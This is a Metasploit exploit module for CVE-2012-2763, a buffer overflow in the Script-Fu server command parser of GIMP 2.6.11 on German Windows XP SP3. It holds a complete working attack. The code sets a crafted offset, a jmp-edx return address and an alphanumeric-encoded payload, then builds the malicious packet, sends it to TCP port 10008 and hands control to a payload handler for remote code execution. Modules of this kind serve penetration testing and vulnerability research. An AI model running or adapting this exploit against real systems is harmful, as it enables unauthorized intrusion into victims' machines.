# Exploit Title: Gimp Script Fu CommandParser Overflow
# Date: June 01 2012
# Author: odem
# Software Link: http://www.oldapps.com/gimp.php
# Version: 2.6.11
# Tested on: Win XP Sp3
# CVE : 2012-2763
##----------------------------------------------------------------##
#  Metasplot module                                                #
#  Gimp 2.6 Extension => Script-Fu server                          #
#  Overflow in command parser                                      #
#  Odem, Ffm, 01.06.2012                                           #
#  Soon available at http://www.noobnerd.net                       #
##----------------------------------------------------------------##

require 'msf/core'
require 'base64'

class Metasploit3 < Msf::Exploit::Remote
	include Exploit::Remote::Tcp

	def initialize(info = {})
		super( update_info( info,
			'Name'          => 'Gimp Script Fu CommandParser Overflow', # g_utf8_strchr -> g_unichar_to_utf8
			'License'       => MSF_LICENSE,								# Msf
			'Version'       => '0.1',									# First Shot...
			'Author' 	 	=> [ 'Joseph Sheridan', 					# Reaction Information Security Limited
								  'odem' ],		 	 					# noobnerddotnet@googlemail.com]
			'Description'   => %q{ This module exploits a bss overflow in the Script-Fu Server CommandParser, 
									which is part of the famous Gimp application. This vulnerability was 
									originally found by Joseph Sheridan from Reaction Information Security Limited.
									Watch links for more information. This module can exploit the German version of
									Windows XP SP3 and maybe more:)},
			'References' 	=> [  [ 'POC', 'http://www.reactionpenetrationtesting.co.uk/advisories/scriptfubof.c' ],
								  [ 'CVE', '2012-2763' ]],				# http://www.reactionpenetrationtesting.co.uk/advisories/scriptfu-buffer-overflow-GIMP-2.6.html 
			'DisclosureDate'=> 'May 18 2012',							# PoC
			'ExploitDate'	=> 'Jun 01 2012',							# This Module
			'Payload'		=> { 'Space'		=> 1000, 				# Plenty...
								  'DisableNops'	=> true,				# Nops are bad
								  'BadChars' 	=> 						# There are a lot more...
										(0x00..0x2f).to_a.pack("C*")},	# Encoding won't hurt!
			'Targets'		=> [ ['Windows XP SP3 Ger', 				# Target 0
									{ 'Ret' 	=> 0x68614472, 			# Jmp edx ( readable ascii in libglib.dll) 
									  'Enc'		=> 'x86/alpha_upper',	# Encode in cause of badchars
									  'Offset' 	=> 3754, 				# Plenty of room for payload
									  'Reg' 	=> 'edx',				# ESI might work too
									  'Platform'=> 'win'} ]],			# Others might work too
			'DefaultOptions'=> { 'EXITFUNC' 	=> 'thread', 			# Silence please...
								  'RPORT' => 10008 },					# Default port
			'DefaultTarget' => 0))
	end

	def exploit

		#Encode
		print_status("Preparing payload...")
		payload.encoder.datastore['Encoder'] = target['Enc']
		payload.encoder.datastore['BufferRegister'] = target['Reg']
		pl=payload.generate

		#Create Evil Packet
		junk = rand_text_alpha(target['Offset'] - pl.length, bad=payload_badchars) 
		packed = [target.ret].pack('V')
		evil = pl + junk + packed

		#Create Header
		hdr="%c%c%c" % [0x47, evil.length / 256, evil.length % 256]

		#Sending malformed Packet
		connect
		print_status("Sending header...")
		sock.put(hdr)
		print_status("Sending exploit...")
		sock.put(evil)
		print_status("Done!")

		#Hand over
		handler
		disconnect
	end
end

